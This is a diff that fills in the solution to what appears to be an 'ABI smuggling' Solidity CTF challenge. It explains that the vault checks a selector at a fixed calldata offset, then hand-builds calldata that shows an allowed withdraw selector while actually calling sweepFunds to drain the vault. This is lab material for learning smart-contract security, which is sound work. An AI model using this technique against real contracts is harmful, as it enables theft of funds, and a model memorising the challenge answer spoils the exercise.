@@ -73,7 +73,62 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        /**
+         * VULNERABILITY EXPLANATION:
+         * The execute() function reads the selector from a FIXED position in calldata:
+         *   uint256 calldataOffset = 4 + 32 * 3 = 100 bytes
+         * 
+         * But the actual actionData location is determined by the ABI-encoded offset!
+         * We can craft calldata where:
+         * - At byte 100: the ALLOWED selector (withdraw = 0xd9caed12)
+         * - At the actual data location: the FORBIDDEN call (sweepFunds)
+         *
+         * Standard ABI encoding for execute(address, bytes):
+         *   0x00-0x03: execute selector
+         *   0x04-0x23: target address
+         *   0x24-0x43: offset to bytes data (normally 0x40)
+         *   0x44-0x63: length of bytes
+         *   0x64+: actual bytes data <- selector read from here (byte 100)
+         *
+         * Our malicious encoding:
+         *   0x00-0x03: execute selector (0x1cff79cd)
+         *   0x04-0x23: target address (vault)
+         *   0x24-0x43: offset = 0x80 (points to byte 132)
+         *   0x44-0x63: padding (zeros)
+         *   0x64-0x67: FAKE selector (withdraw 0xd9caed12) <- checked here!
+         *   0x68-0x83: more padding
+         *   0x84-0xA3: length of real data
+         *   0xA4+: REAL actionData (sweepFunds call)
+         */
+
+        // Build the real sweepFunds calldata
+        bytes memory sweepFundsCall = abi.encodeCall(
+            SelfAuthorizedVault.sweepFunds,
+            (recovery, IERC20(address(token)))
+        );
+
+        // Build the malicious calldata manually
+        bytes memory maliciousCalldata = abi.encodePacked(
+            // execute selector
+            bytes4(0x1cff79cd),
+            // target address (vault) - 32 bytes, left-padded
+            bytes32(uint256(uint160(address(vault)))),
+            // offset to actionData = 0x80 (128 bytes from params start)
+            bytes32(uint256(0x80)),
+            // padding (32 bytes)
+            bytes32(0),
+            // FAKE selector at position 100 (withdraw = 0xd9caed12)
+            // Plus padding to complete 32 bytes
+            bytes4(0xd9caed12), bytes28(0),
+            // length of real actionData
+            bytes32(uint256(sweepFundsCall.length)),
+            // actual sweepFunds calldata
+            sweepFundsCall
+        );
+
+        // Execute the malicious call
+        (bool success,) = address(vault).call(maliciousCalldata);
+        require(success, "attack failed");
     }
 
     /**
